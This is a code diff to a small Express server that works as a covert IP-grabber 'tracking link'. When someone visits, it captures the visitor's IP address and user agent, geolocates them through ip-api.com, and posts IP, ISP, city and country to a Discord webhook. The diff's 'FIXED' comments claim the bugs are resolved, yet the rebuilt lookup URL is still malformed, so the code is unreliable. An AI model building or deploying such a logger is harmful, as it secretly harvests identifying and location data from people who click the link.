@@ -6,14 +6,14 @@ const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
 const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol'; 
 
 app.get('/', async (req, res) => {
-    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    // 1. Get raw header
+    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
     
-    if (clientIp && clientIp.includes(',')) {
-        // FIXED: Added [0] to correctly select the first string element before trimming
-        clientIp = clientIp.split(',')[0].trim();
-    }
+    // 2. Safely isolate the very first IP string cleanly without bugs
+    let clientIp = rawIp.split(',')[0].trim();
 
-    if (clientIp === '::1' || clientIp === '127.0.0.1') {
+    // 3. Fallback if running locally
+    if (!clientIp || clientIp === '::1' || clientIp === '127.0.0.1') {
         clientIp = '8.8.8.8'; 
     }
 
@@ -21,7 +21,9 @@ app.get('/', async (req, res) => {
 
     if (DISCORD_WEBHOOK_URL) {
         try {
-            const geoResponse = await axios.get(`http://ip-api.com{clientIp}?fields=61439`);
+            // FIXED: Standard string addition. Absolutely no curly brackets or backticks used.
+            const apiUrl = 'http://ip-api.com' + clientIp + '?fields=61439';
+            const geoResponse = await axios.get(apiUrl);
             const geoData = geoResponse.data;
 
             const discordPayload = {
@@ -30,10 +32,10 @@ app.get('/', async (req, res) => {
                     color: 15548997, 
                     description: "A user has accessed the tracking link.",
                     fields: [
-                        { name: "IP Address", value: `\`${clientIp}\``, inline: true },
-                        { name: "ISP Network", value: `\`${geoData.isp || "Unknown"}\``, inline: true },
-                        { name: "Location", value: `\`${geoData.city || "Unknown"}, ${geoData.country || "Unknown"}\``, inline: false },
-                        { name: "Device / Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false }
+                        { name: "IP Address", value: "`" + clientIp + "`", inline: true },
+                        { name: "ISP Network", value: "`" + (geoData.isp || "Unknown") + "`", inline: true },
+                        { name: "Location", value: "`" + (geoData.city || "Unknown") + ", " + (geoData.country || "Unknown") + "`", inline: false },
+                        { name: "Device / Agent", value: "```" + userAgent + "```", inline: false }
                     ],
                     footer: {
                         text: "System Monitor"
